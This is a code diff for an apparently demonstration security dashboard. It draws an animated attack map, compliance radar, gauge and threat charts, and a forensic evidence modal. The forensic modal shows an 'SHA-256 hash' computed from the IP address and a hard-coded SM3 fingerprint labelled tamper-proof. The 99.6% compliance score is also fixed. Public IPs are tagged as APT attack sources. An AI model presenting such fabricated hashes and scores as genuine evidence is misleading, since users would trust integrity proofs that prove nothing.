+          <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
+            <span style="font-size:14px; font-weight:700; color:#f87171;">[${e.probe}] ${e.type}</span>
+            <span class="badge badge-danger">${e.level} 威胁</span>
+          </div>
+          <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; font-size:12px; color:#94a3b8; font-family:var(--font-mono);">
+            <div>攻击来源 IP: <span style="color:#f1f5f9;">${e.ip} (${e.geo})</span></div>
+            <div>捕获探针: <span style="color:#00f0ff;">${e.probe} 核心探针</span></div>
+            <div>发现时间: <span style="color:#f1f5f9;">${e.time}</span></div>
+            <div>处置策略: <span style="color:#10b981; font-weight:700;">${e.action}</span></div>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">🚨 攻击原始载荷 (Raw Forensic Payload 取证提取):</label>
+          <pre style="background:#030712; border:1px solid #334155; border-radius:6px; padding:12px; color:#38bdf8; font-family:var(--font-mono); font-size:12px; overflow-x:auto; white-space:pre-wrap;">${e.payload}</pre>
+        </div>
+
+        <div style="background:rgba(0, 240, 255, 0.05); border:1px dashed rgba(0, 240, 255, 0.3); border-radius:6px; padding:10px; font-size:11.5px; color:#94a3b8; font-family:var(--font-mono);">
+          <div style="color:#00f0ff; font-weight:700; margin-bottom:4px;">🔒 等保三级防篡改存证与国密验签:</div>
+          <div>SHA-256 哈希: ${e.ip.split('.').reduce((acc, v) => acc + (parseInt(v)*17).toString(16), 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855').substring(0, 48)}...</div>
+          <div>国密 SM3 指纹: 8f407b46d0a7a40a5a3bc326c596fc713f044038a834220c8974a... (链上不可篡改有效)</div>
+        </div>
+      `;
+      openModal('screenForensicModal');
+    }
+
+    // ==========================================
+    // 攻防全景战局地图 (Cyber Attack Map Canvas)
+    // ==========================================
+    function initCyberAttackMap() {
+      const canvas = document.getElementById('cyberAttackMapCanvas');
+      const container = canvas.parentElement;
+      canvas.width = container.clientWidth;
+      canvas.height = container.clientHeight;
+
+      const w = canvas.width;
+      const h = canvas.height;
+
+      // 定义攻防节点坐标拓扑
+      screenState.nodes = {
+        // 外部攻击源
+        att1: { x: w * 0.12, y: h * 0.22, name: '境外 APT 代理 (US)', ip: '103.21.244.18', type: 'attacker', color: '#ef4444' },
+        att2: { x: w * 0.12, y: h * 0.50, name: 'Tor 暗网跳板 (RU)', ip: '185.220.101.5', type: 'attacker', color: '#ef4444' },
+        att3: { x: w * 0.12, y: h * 0.78, name: '扫描爆破源 (NL)', ip: '45.33.32.156', type: 'attacker', color: '#f59e0b' },
+        
+        // 边界防护
+        waf:  { x: w * 0.36, y: h * 0.35, name: '边缘云 WAF 网关', ip: '192.168.10.15', type: 'defense', color: '#00f0ff' },
+        cfw:  { x: w * 0.36, y: h * 0.65, name: '边界云防火墙微隔离', ip: '192.168.10.16', type: 'defense', color: '#3b82f6' },
+
+        // 内部业务层 (DMZ / APP)
+        dmz:  { x: w * 0.58, y: h * 0.35, name: 'DMZ Web 集群 (防篡改)', ip: '192.168.10.20', type: 'target', color: '#a855f7' },
+        app:  { x: w * 0.58, y: h * 0.65, name: '业务 API (主机 EDR)', ip: '172.16.2.80', type: 'target', color: '#10b981' },
+
+        // 核心数据层 (DATA) 与运维中枢
+        data: { x: w * 0.82, y: h * 0.35, name: '核心数据库 (DBAudit)', ip: '10.0.3.12', type: 'core', color: '#ec4899' },
+        bastion: { x: w * 0.82, y: h * 0.65, name: '4A 运维特权审计', ip: '10.0.1.5', type: 'core', color: '#06b6d4' },
+
+        // 异地灾备
+        backup: { x: w * 0.92, y: h * 0.88, name: '国密异地容灾备份', ip: '10.200.0.1', type: 'backup', color: '#14b8a6' }
+      };
+
+      // 周期性发射新的反击/攻击光束
+      if (screenState.attackTimer) clearInterval(screenState.attackTimer);
+      screenState.attackTimer = setInterval(() => {
+        if (!screenState.active) return;
+        launchAttackRay();
+      }, 1600);
+    }
+
+    // 发射攻击光束激光
+    function launchAttackRay(forcedAttacker, forcedTarget, threatName) {
+      const nodes = screenState.nodes;
+      const attackers = ['att1', 'att2', 'att3'];
+      const targets = ['waf', 'cfw', 'dmz', 'app', 'data', 'bastion'];
+
+      const srcKey = forcedAttacker || attackers[Math.floor(Math.random() * attackers.length)];
+      const dstKey = forcedTarget || targets[Math.floor(Math.random() * targets.length)];
+
+      const src = nodes[srcKey];
+      const dst = nodes[dstKey];
+      if (!src || !dst) return;
+
+      screenState.attackRays.push({
+        src,
+        dst,
+        progress: 0,
+        speed: 0.015 + Math.random() * 0.01,
+        color: src.color,
+        threat: threatName || '攻击探测',
+        cp1: { x: (src.x + dst.x) / 2, y: Math.min(src.y, dst.y) - 30 }
+      });
+
+      playSciFiAlertSound(src.color === '#ef4444' ? 'critical' : 'intercept');
+    }
+
+    // 攻防对抗实弹演练一键触发
+    async function triggerScreenDrill() {
+      showToast('⚡ 触发全栈红蓝实弹攻防对抗演练！');
+      launchAttackRay('att1', 'waf', 'SQL 联合注入探测');
+      setTimeout(() => launchAttackRay('att2', 'app', 'Bash 反弹 Shell 提权'), 400);
+      setTimeout(() => launchAttackRay('att3', 'dmz', 'Web 核心目录篡改'), 800);
+      setTimeout(() => launchAttackRay('att1', 'data', '高危 DROP 勒索删表'), 1200);
+      setTimeout(() => launchAttackRay('att2', 'bastion', '4A 根目录 rm 擦除'), 1600);
+
+      // 同步翻牌器计数递增
+      const counterTotal = document.getElementById('screenCounterTotal');
+      const counterCrit = document.getElementById('screenCounterCritical');
+      counterTotal.innerText = (parseInt(counterTotal.innerText.replace(/,/g, '')) + 8).toLocaleString();
+      counterCrit.innerText = (parseInt(counterCrit.innerText.replace(/,/g, '')) + 5).toLocaleString();
+    }
+
+    // ==========================================
+    // 等保三级能力雷达 (Screen Radar Canvas)
+    // ==========================================
+    function initScreenRadar() {
+      // 动画在主循环中持续绘制
+    }
+
+    function drawScreenRadar() {
+      const canvas = document.getElementById('screenRadarCanvas');
+      if (!canvas) return;
+      const ctx = canvas.getContext('2d');
+      const w = canvas.width;
+      const h = canvas.height;
+      const cx = w / 2;
+      const cy = h / 2;
+      const r = Math.min(cx, cy) - 25;
+
+      ctx.clearRect(0, 0, w, h);
+
+      // 绘制同心多边形网格
+      const levels = 4;
+      const axes = ['S3 安全计算', 'A3 区域边界', 'G3 管理中心', 'C3 通信网络', 'GM/T 密评', 'SOAR 闭环'];
+      const angles = axes.map((_, i) => (i * 2 * Math.PI) / axes.length);
+
+      for (let lvl = 1; lvl <= levels; lvl++) {
+        const rad = (r * lvl) / levels;
+        ctx.beginPath();
+        angles.forEach((ang, i) => {
+          const x = cx + rad * Math.cos(ang);
+          const y = cy + rad * Math.sin(ang);
+          if (i === 0) ctx.moveTo(x, y);
+          else ctx.lineTo(x, y);
+        });
+        ctx.closePath();
+        ctx.strokeStyle = 'rgba(0, 240, 255, 0.15)';
+        ctx.lineWidth = 1;
+        ctx.stroke();
+      }
+
+      // 绘制轴线与文字
+      angles.forEach((ang, i) => {
+        const x = cx + r * Math.cos(ang);
+        const y = cy + r * Math.sin(ang);
+        ctx.beginPath();
+        ctx.moveTo(cx, cy);
+        ctx.lineTo(x, y);
+        ctx.strokeStyle = 'rgba(0, 240, 255, 0.2)';
+        ctx.stroke();
+
+        // 标签文字
+        const tx = cx + (r + 14) * Math.cos(ang);
+        const ty = cy + (r + 14) * Math.sin(ang);
+        ctx.fillStyle = '#94a3b8';
+        ctx.font = '10px -apple-system, sans-serif';
+        ctx.textAlign = 'center';
+        ctx.textBaseline = 'middle';
+        ctx.fillText(axes[i], tx, ty);
+      });
+
+      // 绘制能力多边形 (等保 99.6 分状态)
+      const values = [0.99, 0.98, 1.0, 0.98, 0.99, 1.0];
+      ctx.beginPath();
+      angles.forEach((ang, i) => {
+        const val = values[i];
+        const x = cx + r * val * Math.cos(ang);
+        const y = cy + r * val * Math.sin(ang);
+        if (i === 0) ctx.moveTo(x, y);
+        else ctx.lineTo(x, y);
+      });
+      ctx.closePath();
+      ctx.fillStyle = 'rgba(0, 240, 255, 0.25)';
+      ctx.fill();
+      ctx.strokeStyle = '#00f0ff';
+      ctx.lineWidth = 2;
+      ctx.shadowColor = '#00f0ff';
+      ctx.shadowBlur = 10;
+      ctx.stroke();
+      ctx.shadowBlur = 0;
+
+      // 旋转扫描激光束
+      screenState.radarAngle += 0.035;
+      ctx.beginPath();
+      ctx.moveTo(cx, cy);
+      ctx.arc(cx, cy, r, screenState.radarAngle, screenState.radarAngle + 0.35);
+      ctx.lineTo(cx, cy);
+      const grad = ctx.createRadialGradient(cx, cy, 0, cx, cy, r);
+      grad.addColorStop(0, 'rgba(0, 240, 255, 0)');
+      grad.addColorStop(1, 'rgba(0, 240, 255, 0.45)');
+      ctx.fillStyle = grad;
+      ctx.fill();
+    }
+
+    // ==========================================
+    // 防御指数仪表盘 (Screen Gauge Canvas)
+    // ==========================================
+    function initScreenGauge() {}
+    function drawScreenGauge() {
+      const canvas = document.getElementById('screenGaugeCanvas');
+      if (!canvas) return;
+      const ctx = canvas.getContext('2d');
+      const w = canvas.width;
+      const h = canvas.height;
+      const cx = w / 2;
+      const cy = h - 15;
+      const r = Math.min(cx, cy) - 10;
+
+      ctx.clearRect(0, 0, w, h);
+
+      // 背景半圆弧
+      ctx.beginPath();
+      ctx.arc(cx, cy, r, Math.PI, 2 * Math.PI);
+      ctx.lineWidth = 10;
+      ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)';
+      ctx.stroke();
+
+      // 进度发光圆弧 (99.6%)
+      const score = 0.996;
+      ctx.beginPath();
+      ctx.arc(cx, cy, r, Math.PI, Math.PI + Math.PI * score);
+      const grad = ctx.createLinearGradient(0, cy, w, cy);
+      grad.addColorStop(0, '#00f0ff');
+      grad.addColorStop(0.5, '#3b82f6');
+      grad.addColorStop(1, '#10b981');
+      ctx.strokeStyle = grad;
+      ctx.lineWidth = 10;
+      ctx.shadowColor = '#10b981';
+      ctx.shadowBlur = 8;
+      ctx.stroke();
+      ctx.shadowBlur = 0;
+
+      // 指针
+      const needleAngle = Math.PI + Math.PI * score;
+      ctx.beginPath();
+      ctx.moveTo(cx, cy);
+      ctx.lineTo(cx + (r - 12) * Math.cos(needleAngle), cy + (r - 12) * Math.sin(needleAngle));
+      ctx.strokeStyle = '#fff';
+      ctx.lineWidth = 2;
+      ctx.stroke();
+
+      // 中心刻度文字
+      ctx.fillStyle = '#00f0ff';
+      ctx.font = 'bold 20px var(--font-mono)';
+      ctx.textAlign = 'center';
+      ctx.fillText('99.6%', cx, cy - 20);
+
+      ctx.fillStyle = '#10b981';
+      ctx.font = '10px -apple-system, sans-serif';
+      ctx.fillText('等级: 优 (GB/T 22239-2019 达标)', cx, cy - 5);
+    }
+
+    // ==========================================
+    // 威胁类型分布环形图 (Threat Doughnut Canvas)
+    // ==========================================
+    function initScreenThreatDoughnut() {}
+    function drawScreenThreatDoughnut() {
+      const canvas = document.getElementById('screenThreatDoughnut');
+      if (!canvas) return;
+      const ctx = canvas.getContext('2d');
+      const w = canvas.width;
+      const h = canvas.height;
+      const cx = 65;
+      const cy = h / 2;
+      const r = 40;
+      const innerR = 25;
+
+      ctx.clearRect(0, 0, w, h);
+
+      const data = [
+        { name: 'SQL注入/XSS', pct: 0.35, color: '#00f0ff' },
+        { name: '反弹Shell/提权', pct: 0.25, color: '#ef4444' },
+        { name: '高危DDL删表', pct: 0.18, color: '#f59e0b' },
+        { name: 'Web篡改自愈', pct: 0.12, color: '#a855f7' },
+        { name: '微隔离跨域', pct: 0.10, color: '#10b981' }
+      ];
+
+      let curAngle = -Math.PI / 2;
+      data.forEach(item => {
+        const slice = item.pct * 2 * Math.PI;
+        ctx.beginPath();
+        ctx.arc(cx, cy, r, curAngle, curAngle + slice);
+        ctx.arc(cx, cy, innerR, curAngle + slice, curAngle, true);
+        ctx.closePath();
+        ctx.fillStyle = item.color;
+        ctx.shadowColor = item.color;
+        ctx.shadowBlur = 6;
+        ctx.fill();
+        ctx.shadowBlur = 0;
+        curAngle += slice;
+      });
+
+      // 绘制右侧图例
+      const lx = 140;
+      let ly = 18;
+      data.forEach(item => {
+        ctx.fillStyle = item.color;
+        ctx.fillRect(lx, ly, 8, 8);
+        ctx.fillStyle = '#cbd5e1';
+        ctx.font = '10px -apple-system, sans-serif';
+        ctx.textAlign = 'left';
+        ctx.fillText(`${item.name} (${Math.round(item.pct * 100)}%)`, lx + 14, ly + 8);
+        ly += 18;
+      });
+    }
+
+    // 探针微波形渲染
+    let waveOffset = 0;
+    function drawProbeWaves() {
+      waveOffset += 0.08;
+      screenState.probes.forEach(p => {
+        const canvas = document.getElementById(`probeWave_${p.id}`);
+        if (!canvas) return;
+        const ctx = canvas.getContext('2d');
+        const w = canvas.width;
+        const h = canvas.height;
+        ctx.clearRect(0, 0, w, h);
+
+        ctx.beginPath();
+        for (let x = 0; x < w; x++) {
+          const y = h / 2 + Math.sin(x * 0.1 + waveOffset) * (h * 0.35);
+          if (x === 0) ctx.moveTo(x, y);
+          else ctx.lineTo(x, y);
+        }
+        ctx.strokeStyle = p.color;
+        ctx.lineWidth = 1.5;
+        ctx.shadowColor = p.color;
+        ctx.shadowBlur = 4;
+        ctx.stroke();
+        ctx.shadowBlur = 0;
+      });
+    }
+
+    // ==========================================
+    // 大屏 60 FPS 核心主动画循环
+    // ==========================================
+    function startCyberAnimationLoop() {
+      function loop() {
+        if (!screenState.active) return;
+        
+        // 1. 绘制战局地图
+        drawAttackMap();
+
+        // 2. 绘制雷达与仪表盘
+        drawScreenRadar();
+        drawScreenGauge();
+        drawScreenThreatDoughnut();
+        drawProbeWaves();
+
+        screenState.animFrameId = requestAnimationFrame(loop);
+      }
+      screenState.animFrameId = requestAnimationFrame(loop);
+    }
+
+    // 绘制攻防战局地图主干
+    function drawAttackMap() {
+      const canvas = document.getElementById('cyberAttackMapCanvas');
+      if (!canvas) return;
+      const ctx = canvas.getContext('2d');
+      const w = canvas.width;
+      const h = canvas.height;
+
+      ctx.clearRect(0, 0, w, h);
+
+      // 1. 绘制节点之间网络拓扑拓扑连接虚线
+      const nodes = screenState.nodes;
+      const links = [
+        ['att1', 'waf'], ['att2', 'waf'], ['att3', 'cfw'],
+        ['waf', 'dmz'], ['cfw', 'app'], ['dmz', 'app'],
+        ['app', 'data'], ['app', 'bastion'], ['data', 'backup']
+      ];
+
+      links.forEach(([k1, k2]) => {
+        const n1 = nodes[k1];
+        const n2 = nodes[k2];
+        if (!n1 || !n2) return;
+        ctx.beginPath();
+        ctx.moveTo(n1.x, n1.y);
+        ctx.lineTo(n2.x, n2.y);
+        ctx.strokeStyle = 'rgba(0, 240, 255, 0.08)';
+        ctx.lineWidth = 1;
+        ctx.setLineDash([4, 4]);
+        ctx.stroke();
+        ctx.setLineDash([]);
+      });
+
+      // 2. 更新与绘制所有飞行中的激光攻击光束 (Bezier Curve)
+      for (let i = screenState.attackRays.length - 1; i >= 0; i--) {
+        const ray = screenState.attackRays[i];
+        ray.progress += ray.speed;
+
+        // 计算贝塞尔曲线当前位置
+        const t = ray.progress;
+        const p0 = ray.src;
+        const p1 = ray.cp1;
+        const p2 = ray.dst;
+
+        const cx = (1 - t) * (1 - t) * p0.x + 2 * (1 - t) * t * p1.x + t * t * p2.x;
+        const cy = (1 - t) * (1 - t) * p0.y + 2 * (1 - t) * t * p1.y + t * t * p2.y;
+
+        // 绘制激光头部
+        ctx.beginPath();
+        ctx.arc(cx, cy, 3.5, 0, 2 * Math.PI);
+        ctx.fillStyle = '#fff';
+        ctx.shadowColor = ray.color;
+        ctx.shadowBlur = 12;
+        ctx.fill();
+        ctx.shadowBlur = 0;
+
+        // 绘制尾迹粒子
+        ctx.beginPath();
+        ctx.arc(cx, cy, 7, 0, 2 * Math.PI);
+        ctx.fillStyle = ray.color;
+        ctx.globalAlpha = 0.4;
+        ctx.fill();
+        ctx.globalAlpha = 1.0;
+
+        // 到达目标节点 -> 触发防御盾牌碰撞波
+        if (ray.progress >= 1.0) {
+          screenState.shieldRipples.push({
+            x: p2.x,
+            y: p2.y,
+            radius: 5,
+            maxRadius: 28,
+            color: ray.color,
+            alpha: 1.0
+          });
+          screenState.attackRays.splice(i, 1);
+        }
+      }
+
+      // 3. 更新与绘制目标节点的护盾防御扩散波纹 (Shield Impact Ripples)
+      for (let i = screenState.shieldRipples.length - 1; i >= 0; i--) {
+        const rip = screenState.shieldRipples[i];
+        rip.radius += 1.2;
+        rip.alpha -= 0.04;
+
+        ctx.beginPath();
+        ctx.arc(rip.x, rip.y, rip.radius, 0, 2 * Math.PI);
+        ctx.strokeStyle = rip.color;
+        ctx.lineWidth = 2;
+        ctx.globalAlpha = Math.max(0, rip.alpha);
+        ctx.shadowColor = rip.color;
+        ctx.shadowBlur = 10;
+        ctx.stroke();
+        ctx.shadowBlur = 0;
+        ctx.globalAlpha = 1.0;
+
+        if (rip.alpha <= 0) {
+          screenState.shieldRipples.splice(i, 1);
+        }
+      }
+
+      // 4. 绘制全部网络拓扑节点卡片
+      Object.keys(nodes).forEach(key => {
+        const n = nodes[key];
+        const isAttacker = n.type === 'attacker';
+
+        // 节点外发光光圈
+        ctx.beginPath();
+        ctx.arc(n.x, n.y, isAttacker ? 14 : 18, 0, 2 * Math.PI);
+        ctx.fillStyle = 'rgba(15, 23, 42, 0.9)';
+        ctx.strokeStyle = n.color;
+        ctx.lineWidth = 1.5;
+        ctx.shadowColor = n.color;
+        ctx.shadowBlur = 8;
+        ctx.stroke();
+        ctx.fill();
+        ctx.shadowBlur = 0;
+
+        // 节点内芯图标
+        ctx.beginPath();
+        ctx.arc(n.x, n.y, 4, 0, 2 * Math.PI);
+        ctx.fillStyle = n.color;
+        ctx.fill();
+
+        // 节点文字标注
+        ctx.fillStyle = '#f1f5f9';
+        ctx.font = 'bold 11px -apple-system, sans-serif';
+        ctx.textAlign = 'center';
+        ctx.fillText(n.name, n.x, n.y - (isAttacker ? 20 : 25));
+
+        ctx.fillStyle = '#64748b';
+        ctx.font = '9.5px var(--font-mono)';
+        ctx.fillText(n.ip, n.x, n.y + (isAttacker ? 24 : 28));
+      });
+    }
+
+
+    // 切换大屏/工作台模式（保留旧引用兼容）
+    function legacyToggleScreenMode() {
       state.isScreenMode = !state.isScreenMode;
       const sidebar = document.querySelector('.sidebar');
       const text = document.getElementById('screenModeText');
